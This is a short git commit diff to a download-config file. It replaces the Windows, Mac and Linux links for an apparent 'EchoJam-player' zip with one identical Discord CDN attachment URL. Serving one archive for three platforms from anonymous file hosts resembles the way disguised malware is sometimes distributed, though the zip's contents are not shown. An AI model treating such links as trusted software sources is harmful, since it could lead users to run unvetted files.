bc870310ddf9b43f980c0aed19f9ed07b2146790
ykggtrembala123 <140025450+ykggtrembala123@users.noreply.github.com>
2025-10-14 22:18:44 -0300

    Update downloads.ts

--- src/config/downloads.ts
+++ src/config/downloads.ts
@@ -1,8 +1,8 @@
 // Centralized download configuration
 export const downloadLinks = {
-  windows: "https://files.catbox.moe/nuohlg.zip",
-  mac: "https://files.catbox.moe/nuohlg.zip",
-  linux: "https://files.catbox.moe/nuohlg.zip",
+  windows: "https://cdn.discordapp.com/attachments/1421520176008003636/1427827792690806876/EchoJam-player.zip?ex=68f047c1&is=68eef641&hm=512dbe571c4c42db53cf1ad3cb7f0734429dfe35a3a35d72615440b3d81c8f58&",
+  mac: "https://cdn.discordapp.com/attachments/1421520176008003636/1427827792690806876/EchoJam-player.zip?ex=68f047c1&is=68eef641&hm=512dbe571c4c42db53cf1ad3cb7f0734429dfe35a3a35d72615440b3d81c8f58&",
+  linux: "https://cdn.discordapp.com/attachments/1421520176008003636/1427827792690806876/EchoJam-player.zip?ex=68f047c1&is=68eef641&hm=512dbe571c4c42db53cf1ad3cb7f0734429dfe35a3a35d72615440b3d81c8f58&",
 } as const;
 
 export type Platform = keyof typeof downloadLinks;
